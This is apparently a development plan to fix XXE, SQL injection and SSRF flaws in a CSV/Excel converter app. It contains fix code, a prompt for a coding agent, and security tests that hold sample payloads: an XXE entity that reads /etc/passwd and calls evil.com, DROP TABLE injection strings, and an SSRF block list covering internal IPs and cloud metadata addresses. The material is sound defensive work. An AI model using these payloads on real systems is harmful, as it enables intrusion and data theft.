# Phase 1: Critical Security Fixes

## Priority: CRITICAL
## Estimated Effort: High
## Dependencies: None

---

## Overview

This phase addresses critical security vulnerabilities that could lead to data breaches, server compromise, or denial of service attacks.

---

## Checklist

### 1.1 Fix XXE Vulnerability in XML Parser
- [ ] Update `src/lib/converter/xml.ts` to disable DTD processing
- [ ] Add entity expansion limits
- [ ] Add maximum document size limits
- [ ] Add test cases for XXE attacks
- [ ] Verify fix with security scanner

**File:** `src/lib/converter/xml.ts`
**Lines:** 5-9
**Current Code:**
```typescript
const parser = new XMLParser({
  ignoreAttributes: false,
  attributeNamePrefix: '@_',
});
```

**Required Fix:** Add XXE protection settings

### 1.2 Fix SQL Injection in SQL Generator
- [ ] Implement proper identifier quoting for all databases
- [ ] Add SQL dialect support (MySQL, PostgreSQL, SQLite)
- [ ] Expand reserved words list
- [ ] Add proper string escaping per dialect
- [ ] Add test cases for injection attempts

**File:** `src/lib/converter/sql.ts`
**Lines:** 44-78

### 1.3 Fix SSRF in URL Import
- [ ] Add URL validation and sanitization
- [ ] Implement allowlist for protocols (https only)
- [ ] Add timeout configuration
- [ ] Limit redirects
- [ ] Block internal IP ranges (10.x, 172.16.x, 192.168.x, localhost)
- [ ] Add test cases for SSRF attempts

**File:** `src/components/converter/FileUpload.tsx`
**Lines:** 149-170

### 1.4 Add File Size Validation
- [ ] Add MAX_FILE_SIZE constant (50MB recommended)
- [ ] Validate file size in API routes before processing
- [ ] Add client-side file size check
- [ ] Return proper error messages
- [ ] Add tests for oversized files

**Files:**
- `src/app/api/convert/route.ts`
- `src/app/api/parse/route.ts`
- `src/components/converter/FileUpload.tsx`

### 1.5 Add Security Headers
- [ ] Create security middleware
- [ ] Add Content-Security-Policy header
- [ ] Add X-Content-Type-Options header
- [ ] Add X-Frame-Options header
- [ ] Add X-XSS-Protection header
- [ ] Add Referrer-Policy header

**File:** Create `src/middleware.ts` (enhance existing)

### 1.6 Add Input Sanitization
- [ ] Sanitize filenames in API responses
- [ ] Remove path information from file metadata
- [ ] Escape special characters in user inputs
- [ ] Add input length limits

**Files:**
- `src/app/api/convert/route.ts`
- `src/app/api/parse/route.ts`

### 1.7 Add Rate Limiting
- [ ] Implement rate limiting middleware
- [ ] Configure limits per endpoint
- [ ] Add proper 429 responses
- [ ] Add rate limit headers

**File:** Create `src/lib/rate-limit.ts`

### 1.8 Add Security Tests
- [ ] Create `__tests__/security/xxe.test.ts`
- [ ] Create `__tests__/security/sql-injection.test.ts`
- [ ] Create `__tests__/security/ssrf.test.ts`
- [ ] Create `__tests__/security/file-size.test.ts`

---

## Detailed Implementation

### 1.1 XXE Fix Implementation

```typescript
// src/lib/converter/xml.ts - Updated
import { XMLParser, XMLBuilder } from 'fast-xml-parser';

const MAX_XML_SIZE = 50 * 1024 * 1024; // 50MB
const MAX_ENTITY_EXPANSIONS = 10000;

const parserOptions = {
  ignoreAttributes: false,
  attributeNamePrefix: '@_',
  // XXE Protection
  allowBooleanAttributes: true,
  parseTagValue: true,
  parseAttributeValue: true,
  trimValues: true,
  // Disable external entities
  processEntities: false,
  // Limit parsing depth
  htmlEntities: false,
};

export function parseXml(data: string): ParsedData {
  // Size check
  if (data.length > MAX_XML_SIZE) {
    throw new Error(`XML file too large. Maximum size is ${MAX_XML_SIZE / 1024 / 1024}MB`);
  }

  // Check for DOCTYPE declarations (potential XXE)
  if (/<!DOCTYPE[^>]*>/i.test(data)) {
    throw new Error('DOCTYPE declarations are not allowed for security reasons');
  }

  // Check for entity declarations
  if (/<!ENTITY[^>]*>/i.test(data)) {
    throw new Error('Entity declarations are not allowed for security reasons');
  }

  const parser = new XMLParser(parserOptions);
  // ... rest of implementation
}
```

### 1.2 SQL Injection Fix Implementation

```typescript
// src/lib/converter/sql.ts - Updated

type SqlDialect = 'mysql' | 'postgresql' | 'sqlite' | 'mssql';

interface SqlOptions {
  tableName?: string;
  includeCreate?: boolean;
  batchSize?: number;
  dialect?: SqlDialect;
}

const RESERVED_WORDS = new Set([
  'SELECT', 'FROM', 'WHERE', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'CREATE',
  'TABLE', 'INDEX', 'ALTER', 'ADD', 'COLUMN', 'VALUES', 'SET', 'AND', 'OR',
  'NOT', 'NULL', 'TRUE', 'FALSE', 'IN', 'BETWEEN', 'LIKE', 'ORDER', 'BY',
  'GROUP', 'HAVING', 'JOIN', 'LEFT', 'RIGHT', 'INNER', 'OUTER', 'ON', 'AS',
  'DISTINCT', 'COUNT', 'SUM', 'AVG', 'MIN', 'MAX', 'UNION', 'ALL', 'CASE',
  'WHEN', 'THEN', 'ELSE', 'END', 'LIMIT', 'OFFSET', 'ASC', 'DESC', 'PRIMARY',
  'KEY', 'FOREIGN', 'REFERENCES', 'CONSTRAINT', 'DEFAULT', 'CHECK', 'UNIQUE',
]);

function getQuoteChar(dialect: SqlDialect): string {
  switch (dialect) {
    case 'mysql': return '`';
    case 'mssql': return '"';
    default: return '"';
  }
}

function escapeIdentifier(identifier: string, dialect: SqlDialect): string {
  const quote = getQuoteChar(dialect);
  // Always quote identifiers to be safe
  const escaped = identifier.replace(new RegExp(quote, 'g'), quote + quote);
  return `${quote}${escaped}${quote}`;
}

function escapeString(str: string, dialect: SqlDialect): string {
  if (str === null || str === undefined) return 'NULL';

  switch (dialect) {
    case 'mysql':
      return `'${str.replace(/\\/g, '\\\\').replace(/'/g, "\\'")}'`;
    default:
      return `'${str.replace(/'/g, "''")}'`;
  }
}
```

### 1.3 SSRF Fix Implementation

```typescript
// src/lib/url-validator.ts - New file

const BLOCKED_HOSTS = [
  'localhost',
  '127.0.0.1',
  '0.0.0.0',
  '::1',
  'metadata.google.internal',
  '169.254.169.254', // AWS metadata
];

const BLOCKED_IP_RANGES = [
  /^10\./,           // 10.0.0.0/8
  /^172\.(1[6-9]|2[0-9]|3[0-1])\./, // 172.16.0.0/12
  /^192\.168\./,     // 192.168.0.0/16
  /^127\./,          // 127.0.0.0/8
  /^0\./,            // 0.0.0.0/8
];

export function validateUrl(urlString: string): { valid: boolean; error?: string } {
  try {
    const url = new URL(urlString);

    // Only allow HTTPS
    if (url.protocol !== 'https:') {
      return { valid: false, error: 'Only HTTPS URLs are allowed' };
    }

    // Check blocked hosts
    if (BLOCKED_HOSTS.includes(url.hostname.toLowerCase())) {
      return { valid: false, error: 'This host is not allowed' };
    }

    // Check blocked IP ranges
    for (const range of BLOCKED_IP_RANGES) {
      if (range.test(url.hostname)) {
        return { valid: false, error: 'Internal IP addresses are not allowed' };
      }
    }

    // Check for unusual ports
    if (url.port && !['443', '80', ''].includes(url.port)) {
      return { valid: false, error: 'Non-standard ports are not allowed' };
    }

    return { valid: true };
  } catch {
    return { valid: false, error: 'Invalid URL format' };
  }
}

export async function secureFetch(url: string, options: RequestInit = {}): Promise<Response> {
  const validation = validateUrl(url);
  if (!validation.valid) {
    throw new Error(validation.error);
  }

  return fetch(url, {
    ...options,
    redirect: 'manual', // Don't follow redirects automatically
    signal: AbortSignal.timeout(30000), // 30 second timeout
  });
}
```

### 1.4 File Size Validation Implementation

```typescript
// src/lib/constants.ts - New file

export const MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB
export const MAX_ROWS = 100000;
export const MAX_COLUMNS = 1000;

// src/app/api/convert/route.ts - Updated
import { MAX_FILE_SIZE } from '@/lib/constants';

export async function POST(request: NextRequest) {
  const formData = await request.formData();
  const file = formData.get('file') as File | null;

  if (file) {
    if (file.size > MAX_FILE_SIZE) {
      return NextResponse.json(
        {
          success: false,
          error: `File too large. Maximum size is ${MAX_FILE_SIZE / 1024 / 1024}MB`
        },
        { status: 413 }
      );
    }
  }
  // ... rest
}
```

### 1.5 Security Headers Implementation

```typescript
// src/middleware.ts - Updated
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';
import createMiddleware from 'next-intl/middleware';
import { routing } from './i18n/routing';

const intlMiddleware = createMiddleware(routing);

const securityHeaders = {
  'Content-Security-Policy': [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: blob:",
    "font-src 'self'",
    "connect-src 'self'",
    "frame-ancestors 'none'",
  ].join('; '),
  'X-Content-Type-Options': 'nosniff',
  'X-Frame-Options': 'DENY',
  'X-XSS-Protection': '1; mode=block',
  'Referrer-Policy': 'strict-origin-when-cross-origin',
  'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
};

export default function middleware(request: NextRequest) {
  const response = intlMiddleware(request);

  // Add security headers
  Object.entries(securityHeaders).forEach(([key, value]) => {
    response.headers.set(key, value);
  });

  return response;
}
```

---

## Testing Requirements

### Security Test Cases

```typescript
// __tests__/security/xxe.test.ts
describe('XXE Protection', () => {
  it('should reject XML with DOCTYPE', async () => {
    const maliciousXml = `<?xml version="1.0"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <root>&xxe;</root>`;

    await expect(parseXml(maliciousXml)).rejects.toThrow('DOCTYPE');
  });

  it('should reject XML with external entities', async () => {
    const maliciousXml = `<?xml version="1.0"?>
      <!ENTITY xxe SYSTEM "http://evil.com/xxe">
      <root>&xxe;</root>`;

    await expect(parseXml(maliciousXml)).rejects.toThrow('Entity');
  });
});

// __tests__/security/sql-injection.test.ts
describe('SQL Injection Protection', () => {
  it('should properly escape table names', () => {
    const result = writeSql(['col'], [{}], { tableName: 'DROP TABLE users;--' });
    expect(result).not.toContain('DROP TABLE users');
    expect(result).toContain('"DROP TABLE users;--"');
  });

  it('should properly escape column names', () => {
    const result = writeSql(['col"; DROP TABLE users;--'], [{}], {});
    expect(result).not.toContain('DROP TABLE');
  });
});
```

---

## Verification Steps

1. Run security tests: `npm run test:unit -- --grep "security"`
2. Run OWASP ZAP scan against running app
3. Check headers: `curl -I http://localhost:3000`
4. Test XXE manually with payload
5. Test SQL injection manually
6. Test SSRF with internal URLs
7. Test file size limits with large file

---

## Rollback Plan

If issues arise:
1. Revert to previous commit
2. Keep security changes in separate branch
3. Fix issues and re-test
4. Re-deploy when stable

---

## Prompt for Claude Code

```
Execute Phase 1: Critical Security Fixes for CSV-Excel-Converter

Read the plan at plans/01-phase-security.md and implement all security fixes:

1. Fix XXE vulnerability in src/lib/converter/xml.ts:
   - Add DOCTYPE and ENTITY detection/rejection
   - Configure fast-xml-parser with secure settings
   - Add file size limits

2. Fix SQL injection in src/lib/converter/sql.ts:
   - Implement proper identifier quoting with dialect support
   - Expand reserved words list
   - Fix string escaping per dialect

3. Fix SSRF in FileUpload component:
   - Create src/lib/url-validator.ts
   - Validate URLs before fetch
   - Block internal IPs and localhost
   - Enforce HTTPS only
   - Add timeout

4. Add file size validation:
   - Create src/lib/constants.ts with MAX_FILE_SIZE
   - Add validation in API routes
   - Add client-side validation

5. Add security headers:
   - Update src/middleware.ts with CSP and other headers

6. Create security tests:
   - __tests__/security/xxe.test.ts
   - __tests__/security/sql-injection.test.ts
   - __tests__/security/ssrf.test.ts
   - __tests__/security/file-size.test.ts

7. Update translation files with new error messages

Run all tests after implementation to verify nothing broke.
```
